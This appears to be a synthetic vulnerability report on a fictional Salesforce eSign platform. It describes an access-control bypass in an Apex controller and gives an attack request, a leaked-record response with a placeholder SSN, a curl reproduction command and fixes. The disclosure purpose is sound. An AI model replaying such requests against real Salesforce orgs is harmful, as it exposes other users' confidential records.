# Security Analysis Report
**System:** SignFlow eSign Platform (Salesforce-Integrated)
**Domain:** Document Signing / eSign
**Example ID:** SF-0097
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass on `OpportunityController.getOpportunity` — attacker reads any eSign Opportunity record by bypassing Salesforce sharing rules |

---

## Finding 1 — Platform: SOQL Record-Level Access Bypass on Opportunity Object (Pattern 9.2)

### Summary
The Apex controller `OpportunityController` on SignFlow eSign Platform (`a8e397bc.lightning.force.com`) is declared `without sharing`, which bypasses Salesforce OWD=Private sharing rules on the Opportunity object. Per §5.0 Pattern 9.2, the SOQL query lacks `WITH SECURITY_ENFORCED` and has no ownership predicate, meaning the Platform's record-level access controls are silently bypassed at the database layer. Any attacker with a valid Salesforce session can retrieve any Opportunity record by substituting `opportunityId`.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getOpportunityDetails(String opportunityId, ...)` but the Aura descriptor in §6.0 is `c.OpportunityController.getOpportunity`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://a8e397bc.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://a8e397bc.lightning.force.com/aura
Authorization: Bearer 00DA8E397BC!ARa8e397bc...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DA8E397BC!ARa8e397bc...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"00197BC","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00197BC", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-78-1970"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DA8E397BC!ARa8e397bc..."
curl -s -X POST "https://a8e397bc.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"00197BC","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-78-1970
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
